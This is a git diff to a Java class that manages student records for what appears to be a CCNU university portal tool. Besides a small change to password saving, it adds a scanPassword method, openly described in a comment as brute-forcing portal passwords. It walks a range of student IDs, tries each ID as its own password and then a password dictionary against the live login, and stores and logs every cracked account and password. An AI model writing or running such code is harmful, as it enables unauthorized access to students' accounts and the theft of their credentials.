@@ -2,7 +2,10 @@ package tool.ccnu.student;
 
 import org.hibernate.Query;
 import org.hibernate.Session;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 import tool.HibernateUtil;
+import tool.ccnu.CCNUPortal;
 
 import java.util.List;
 
@@ -12,6 +15,8 @@ import java.util.List;
  * TODO 其实所有功能都应该围绕学生信息来展开,这才是核心
  */
 public class ManageStudents {
+
+	private static final Logger log = LoggerFactory.getLogger(ManageStudents.class);
 
 	/**
 	 * 获得学号为xh的同学
@@ -123,7 +128,7 @@ public class ManageStudents {
 	/**
 	 * 更新学号为xh的同学的密码到数据库
 	 * 不会重新去数据库抓取信息只更新密码
-	 * TODO 需要异步执行去信息门户抓取信息然后解析然后保存都数据库
+	 * 如果数据库中还不存在这个同学的信息就先把账号密码保存到数据库
 	 *
 	 * @param xh       学号
 	 * @param password 新的密码
@@ -131,8 +136,41 @@ public class ManageStudents {
 	 */
 	public static boolean update_PasswordToSQL(String xh, String password) {
 		StudentsEntity studentsEntity = get(xh);
+		if (studentsEntity == null) {//如果数据库中还不存在这个同学的信息就先把账号密码保存到数据库 TODO 需要异步执行去信息门户抓取信息然后解析然后保存都数据库
+			studentsEntity = new StudentsEntity();
+			studentsEntity.setXh(xh);
+		}
 		studentsEntity.setPassword(password);
-		return HibernateUtil.updateEntity(studentsEntity);
+		return HibernateUtil.addOrUpdateEntity(studentsEntity);
+	}
+
+	/**
+	 * 暴力破解信息门户账号密码
+	 *
+	 * @param start 开始的学号
+	 * @param end   结束的学号
+	 * @param pass  密码字典,同时还会探测和账号一样的密码
+	 * @return 成功猜对的个数
+	 */
+	public static int scanPassword(int start, int end, String pass[]) {
+		int re = 0;
+		for (int i = start; i <= end; i++) {
+			String xh = Integer.toString(i);
+			if (CCNUPortal.XHMMisTrue(xh, xh)) {
+				re++;
+				update_PasswordToSQL(xh, xh);
+				log.info("成功猜对账号{}密码{}", xh, xh);
+			} else {
+				for (String one : pass) {
+					if (CCNUPortal.XHMMisTrue(xh, one)) {
+						re++;
+						update_PasswordToSQL(xh, one);
+						log.info("成功猜对账号{}密码{}", xh, one);
+					}
+				}
+			}
+		}
+		return re;
 	}
 
 
